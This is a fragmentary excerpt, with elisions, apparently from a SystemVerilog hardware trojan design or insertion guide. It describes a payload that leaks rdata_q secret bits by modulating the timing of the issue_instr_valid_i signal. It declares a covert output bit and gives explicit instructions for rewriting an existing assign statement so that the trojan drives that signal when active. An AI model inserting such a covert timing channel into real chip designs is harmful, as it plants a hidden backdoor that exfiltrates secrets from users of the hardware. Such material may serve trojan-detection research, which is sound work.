 ...
 * Payload: Modulate issue_instr_valid_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of issue_instr_valid_i:
...
logic       covert_bit_out;         // Drives issue_instr_valid_i when trojan active
...
//   Find the assign for issue_instr_valid_i (or rd_error_o as fallback):
//     assign issue_instr_valid_i = <normal_expr>;
//   Replace with:
//     assign issue_instr_valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
